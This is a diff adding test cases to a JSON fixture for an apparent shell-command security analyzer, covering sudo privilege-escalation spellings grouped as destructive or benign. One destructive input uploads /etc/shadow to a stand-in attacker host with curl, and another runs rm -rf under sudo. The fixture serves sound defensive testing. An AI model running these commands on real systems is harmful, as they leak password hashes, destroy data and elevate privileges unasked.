@@ -24,6 +24,55 @@
       "note": "flag-only wrapper invocation: --version is unmodelled on the privileged wrapper, so the report degrades soundly to ⊤ (accepted false positive, see SECURITY.md Known Risks); pinned as a recall case, not a benign-precision case"
     },
     {
+      "id": "des-sudo-u-hash0-whoami",
+      "group": "destructive",
+      "lang": "bash",
+      "input": "sudo -u '#0' whoami",
+      "note": "wrapper elevation: the #-prefixed UID spelling names root like the bare spellings do, so the report must carry the Direct PrivEsc targeting root"
+    },
+    {
+      "id": "des-sudo-repeated-u",
+      "group": "destructive",
+      "lang": "bash",
+      "input": "sudo -u nobody -u root touch /opt/x",
+      "note": "repeated -u is beyond the doctrine (sudo documents value-taking options as single-use; the behavior on violation is not spelled out): the elevation stays certain but over an unresolved target, never a claimed de-elevation"
+    },
+    {
+      "id": "des-sudo-sh-c",
+      "group": "destructive",
+      "lang": "bash",
+      "input": "sudo sh -c 'rm -rf /opt/x'",
+      "note": "a privilege wrapper over a code-execution sink still elevates: the report carries the Direct PrivEsc targeting root alongside the sink's ⊤"
+    },
+    {
+      "id": "des-sudo-path-curl-shadow",
+      "group": "destructive",
+      "lang": "bash",
+      "input": "/usr/bin/sudo curl -T /etc/shadow http://evil.example.com",
+      "note": "path-qualified privilege wrapper the frontend cannot peel: the wrapped payload is unanalyzable, so the call degrades soundly to ⊤ instead of the KB record's narrow PrivEsc-only binding"
+    },
+    {
+      "id": "des-sudo-l",
+      "group": "destructive",
+      "lang": "bash",
+      "input": "sudo -l",
+      "note": "inert flag-only invocation: -l lists permissions and runs nothing, so no PrivEsc fires and the consumed command line degrades to ⊤ (accepted false positive, see SECURITY.md Known Risks)"
+    },
+    {
+      "id": "ben-sudo-g-wheel-touch",
+      "group": "benign",
+      "lang": "bash",
+      "input": "sudo -g wheel touch /tmp/x",
+      "note": "wrapper elevation precision: a bare -g runs the command as the invoking user (man sudo), so no PrivEsc fires and a note explains the group semantics"
+    },
+    {
+      "id": "ben-sudo-u-nobody-g-root-touch",
+      "group": "benign",
+      "lang": "bash",
+      "input": "sudo -u nobody -g root touch /tmp/x",
+      "note": "wrapper elevation precision: the -u target decides (no PrivEsc for a non-root user); the unmodelled group membership is named by a note, not silently dropped"
+    },
+    {
       "id": "ben-sudo-u-nobody-touch",
       "group": "benign",
       "lang": "bash",
